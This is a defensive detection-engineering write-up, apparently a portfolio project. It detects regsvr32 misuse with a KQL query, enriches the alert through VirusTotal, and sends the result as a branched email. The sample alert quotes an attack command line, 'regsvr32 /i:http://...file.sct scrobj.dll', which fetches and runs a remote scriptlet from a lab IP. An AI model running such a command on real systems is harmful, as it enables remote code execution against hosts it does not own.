# **🔄 Regsvr32 SOAR Workflow with VirusTotal Enrichment**

## **🧠 Overview**

This project simulates a medium-risk, high-noise detection scenario involving the abuse of regsvr32.exe — a trusted Windows binary often used in LOLBAS (Living Off the Land Binaries and Scripts) attacks. The goal was to detect potential misuse of regsvr32 for remote code execution, enrich the alert context via VirusTotal, and use SOAR (Security Orchestration, Automation, and Response) logic to reduce analyst workload through smart alerting and contextual decision-making.

Unlike previous investigations that focused on multi-stage attack chains, this project pivots into **alert enrichment and triage automation** — demonstrating how to turn a simple detection into a scalable, analyst-ready workflow.

---

## **🔍 Why Regsvr32?**

Regsvr32 is a signed Microsoft binary that allows execution of remote scripts via COM scriptlets hosted over HTTP/S. It’s abused by threat actors because:

* It’s **built-in**, **trusted**, and **commonly overlooked**

* Legitimate usage is rare and predictable

* Remote execution via regsvr32 almost always indicates suspicious activity

This project targets regsvr32 executions **that include an HTTP reference in the command line**, which strongly implies the tool is being used to download and execute code from an external source. This behavior maps to **MITRE ATT\&CK T1218.010 – Signed Binary Proxy Execution: Regsvr32**.

The key was not just detecting it, but doing something meaningful with the alert: **enrich, suppress noise, and inform response.**

---

## **📌 Detection Logic**

The detection is based on **MITRE DS0017: Process Creation**, using Windows Event ID `1`. Because my lab uses the Microsoft Monitoring Agent (MMA), logs arrive as raw XML rather than in schema-based tables — requiring field extraction via `extract()` in KQL.

Event  
| where EventID \== 1  
| extend raw\_xml \= tostring(EventData)  
| extend  
    Image \= extract(@"\<Data Name=""Image""\>(.\*?)\</Data\>", 1, raw\_xml),  
    CommandLine \= extract(@"\<Data Name=""CommandLine""\>(.\*?)\</Data\>", 1, raw\_xml),  
    ParentImage \= extract(@"\<Data Name=""ParentImage""\>(.\*?)\</Data\>", 1, raw\_xml),  
    User \= extract(@"\<Data Name=""User""\>(.\*?)\</Data\>", 1, raw\_xml),  
    IntegrityLevel \= extract(@"\<Data Name=""IntegrityLevel""\>(.\*?)\</Data\>", 1, raw\_xml)  
| where Image endswith "regsvr32.exe"  
      and CommandLine has "http"

This query identifies executions of regsvr32 where the command line includes a remote payload — the exact behavior this project is designed to catch and enrich.

---

## **🧱 Field Extraction and Triage Context**

These fields are extracted to drive enrichment and downstream decisions:

| Field | Purpose |
| ----- | ----- |
| Image | Confirms regsvr32.exe was executed |
| CommandLine | Parses the URL or IP; reveals intent and payload |
| ParentImage | Provides process ancestry — e.g., PowerShell is a strong signal |
| User | Execution context (admin? service? test account?) |
| IntegrityLevel | Indicates privilege level — rare for regsvr32 to run elevated |
| ExtractedIP | Parsed using regex from the `CommandLine`; used in enrichment |

---

## **🌐 VirusTotal Integration**

The enrichment step uses VirusTotal’s **IP reputation API**. The Logic App sends a **GET** request to:

https://www.virustotal.com/api/v3/ip\_addresses/{ExtractedIP}

Using a personal API key and custom headers, it retrieves the full reputation object. From that JSON, the workflow parses:

* last\_analysis\_stats.malicious — number of AV engines flagging it

* reputation — VirusTotal's cumulative score

I used browser DevTools (network inspector) to manually query and examine the JSON schema before writing the parsing logic in Logic Apps.

This lets me enrich the alert in real-time with **actual external evidence**, not just internal assumptions.

---

## **🧠 Branching Logic & Alert Flow**

The SOAR logic applies a condition:

IF malicious \> 0 OR reputation \< 0  
  → Send ALERT email to SOC  
ELSE  
  → Send INFO email (low priority)

This split allows:

* High-confidence alerts to escalate immediately

* Low-risk alerts to be logged passively

* Complete coverage without overloading analysts

In production, this structure would prevent alert fatigue **without missing early-stage threats**.

---

## **✉️ Email Design**

The email format is intentionally clean and analyst-friendly.

### **Subject:**

\[ALERT\] Suspicious Regsvr32 Activity | User: redteam | IP: 192.168.1.80

### **Body:**

\- User: redteam  
\- Image: C:\\Windows\\System32\\regsvr32.exe  
\- Parent Image: powershell.exe  
\- CommandLine: regsvr32 /i:http://192.168.1.80/file.sct scrobj.dll  
\- Integrity Level: High  
\- Contacted IP: 192.168.1.80  
\- VT Malicious Score: 3  
\- VT Reputation Score: \-10

Recommended Actions:  
\- Investigate user activity  
\- Review traffic to the contacted IP  
\- Isolate the host if confirmed

The subject line offers **instant triage context**; the body gives **pivot points and next steps**.

---

## **🧠 Reflection and What I Learned**

This project marked my first time designing a complete SOAR workflow — not just writing detections, but building a system that takes raw alerts, enriches them with external intelligence, and produces outcomes that save time and support decision-making. It forced me to think like both a SOC analyst and a detection engineer: how to structure signals, reduce noise, and deliver relevant context to the right place at the right time.

Key skills I developed:

* **Working with JSON in Logic Apps** — including how to reverse-engineer API responses using DevTools, extract the schema structure, and parse only the relevant fields

* **Designing conditional logic** to filter noise without missing real threats

* **Building enrichment workflows** that reflect real-world use cases — not just lab setups

---

### **💡 Ideas for Further Improvement**

If I were deploying this in a production SOC, these are the changes I’d make to extend and harden the system:

---

#### **1\. Branching on HTTP Status Code**

If the VirusTotal request fails (e.g. IP not found), the response returns a 404\. Currently, that breaks the flow. I’d add a condition to check the statusCode directly after the HTTP call. If it equals 404, I’d route the logic to either a secondary enrichment source (like AbuseIPDB) or still notify the SOC with a tag like "VirusTotal lookup unavailable".

Prevents silent failures — the alert still reaches the analyst with appropriate context.

---

#### **2\. Filename Extraction from Command Line**

Right now, only the IP is parsed. I’d extend the KQL to also extract the filename from the URL (using parse\_url() or regex). That would allow me to pass the filename to the Logic App, calculate a hash (e.g. SHA256), and enable deeper file-based enrichment.

---

#### **3\. Hash-Based Enrichment**

With the filename extracted and hashed, I’d query a file reputation API (e.g. Hybrid Analysis or ReversingLabs) alongside VirusTotal. The resulting file score would be parsed and added to the branching logic.

This helps detect **malicious files hosted on clean infrastructure**, which would otherwise evade IP-based detection alone.

---

#### **4\. Expanded Conditional Logic**

Currently, alerts trigger if:

malicious \> 0 OR reputation \< 0

With hash-based enrichment added, I’d extend the condition to:

malicious \> 0 OR reputation \< 0 OR file\_score \> threshold

This tightens the funnel and increases the likelihood that alerts represent true threats, without becoming overly aggressive.

---

#### **5\. Tagging Known-Good Use Cases**

Eventually, I’d implement a tagging or allowlisting mechanism — for example, to suppress alerts from internal test environments or known automation. This would allow silent logging without polluting the analyst’s queue.

---

### **🔚 Final Thoughts**

This project wasn’t about building a perfect detection — it was about showing that I can:

* Take a noisy but relevant technique

* Build a reliable, low-noise detection

* Enrich it with external intelligence

* Use branching logic to drive decisions

* And design something a SOC analyst would actually want to receive at 2AM

I now feel confident not just writing detection rules, but thinking end-to-end about **how alerts should flow**, **who they’re for**, and **what makes them actionable**.
